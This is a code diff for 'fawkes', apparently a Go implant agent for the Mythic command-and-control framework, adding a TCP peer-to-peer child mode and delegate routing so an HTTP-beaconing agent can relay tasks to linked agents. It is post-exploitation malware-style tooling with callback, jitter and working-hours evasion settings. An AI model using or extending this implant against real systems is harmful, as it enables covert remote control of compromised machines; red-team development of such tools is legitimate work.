@@ -24,6 +24,7 @@ import (
 	"fawkes/pkg/profiles"
 	"fawkes/pkg/socks"
 	"fawkes/pkg/structs"
+	"fawkes/pkg/tcp"
 )
 
 var (
@@ -46,6 +47,7 @@ var (
 	workingHoursStart string = ""     // Working hours start (HH:MM, 24hr local time)
 	workingHoursEnd   string = ""     // Working hours end (HH:MM, 24hr local time)
 	workingDays       string = ""     // Active days (1-7, Mon=1, Sun=7, comma-separated)
+	tcpBindAddress    string = ""     // TCP P2P bind address (e.g., "0.0.0.0:7777"). Empty = HTTP egress mode.
 )
 
 func main() {
@@ -149,32 +151,57 @@ func runAgent() {
 		WorkingDays:       whDays,
 	}
 
-	// Initialize HTTP profile
-	// Construct callback URL properly - check if callbackHost already has protocol
-	var callbackURL string
-	if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
-		callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
+	// Initialize C2 profile based on configuration
+	var c2 profiles.Profile
+
+	if tcpBindAddress != "" {
+		// TCP P2P mode — this agent is a child that listens for a parent connection
+		log.Printf("[INFO] TCP P2P mode: binding to %s", tcpBindAddress)
+		tcpProfile := tcp.NewTCPProfile(tcpBindAddress, encryptionKey, debugBool)
+		c2 = profiles.NewTCPProfile(tcpProfile)
+		// Make TCP profile available to link/unlink commands
+		commands.SetTCPProfile(tcpProfile)
 	} else {
-		callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
+		// HTTP egress mode (default)
+		var callbackURL string
+		if strings.HasPrefix(callbackHost, "http://") || strings.HasPrefix(callbackHost, "https://") {
+			callbackURL = fmt.Sprintf("%s:%d", callbackHost, callbackPortInt)
+		} else {
+			callbackURL = fmt.Sprintf("http://%s:%d", callbackHost, callbackPortInt)
+		}
+
+		httpProfile := http.NewHTTPProfile(
+			callbackURL,
+			userAgent,
+			encryptionKey,
+			maxRetriesInt,
+			sleepIntervalInt,
+			jitterInt,
+			debugBool,
+			getURI,
+			postURI,
+			hostHeader,
+			proxyURL,
+			tlsVerify,
+		)
+		c2 = profiles.NewProfile(httpProfile)
+
+		// Also create a TCP profile instance for P2P child management.
+		// Even HTTP egress agents can link to TCP children.
+		tcpP2P := tcp.NewTCPProfile("", encryptionKey, debugBool)
+		commands.SetTCPProfile(tcpP2P)
+
+		// Wire up delegate hooks so the HTTP profile routes P2P delegate messages
+		httpProfile.GetDelegatesOnly = func() []structs.DelegateMessage {
+			return tcpP2P.DrainDelegatesOnly()
+		}
+		httpProfile.GetDelegatesAndEdges = func() ([]structs.DelegateMessage, []structs.P2PConnectionMessage) {
+			return tcpP2P.DrainDelegatesAndEdges()
+		}
+		httpProfile.HandleDelegates = func(delegates []structs.DelegateMessage) {
+			tcpP2P.RouteToChildren(delegates)
+		}
 	}
-
-	httpProfile := http.NewHTTPProfile(
-		callbackURL,
-		userAgent,
-		encryptionKey,
-		maxRetriesInt,
-		sleepIntervalInt,
-		jitterInt,
-		debugBool,
-		getURI,
-		postURI,
-		hostHeader,
-		proxyURL,
-		tlsVerify,
-	)
-
-	// Initialize C2 profile
-	c2 := profiles.NewProfile(httpProfile)
 
 	// Initialize command handlers
 	commands.Initialize()
@@ -189,6 +216,12 @@ func runAgent() {
 		return
 	}
 	log.Printf("[INFO] Initial checkin successful")
+
+	// After successful HTTP checkin, propagate the callback UUID to the TCP P2P instance.
+	// This ensures edge messages use the correct parent UUID for Mythic's P2P graph.
+	if tcpP2P := commands.GetTCPProfile(); tcpP2P != nil && tcpP2P.CallbackUUID == "" {
+		tcpP2P.CallbackUUID = c2.GetCallbackUUID()
+	}
 
 	// Create context for graceful shutdown
 	ctx, cancel := context.WithCancel(context.Background())
@@ -391,6 +424,7 @@ func processTaskWithAgent(task structs.Task, agent *structs.Agent, c2 profiles.P
 		UserOutput: result.Output,
 		Status:     result.Status,
 		Completed:  result.Completed,
+		Processes:  result.Processes,
 	}
 	if _, err := c2.PostResponse(response, agent, socksManager.DrainOutbound()); err != nil {
 		log.Printf("[ERROR] Failed to post response: %v", err)
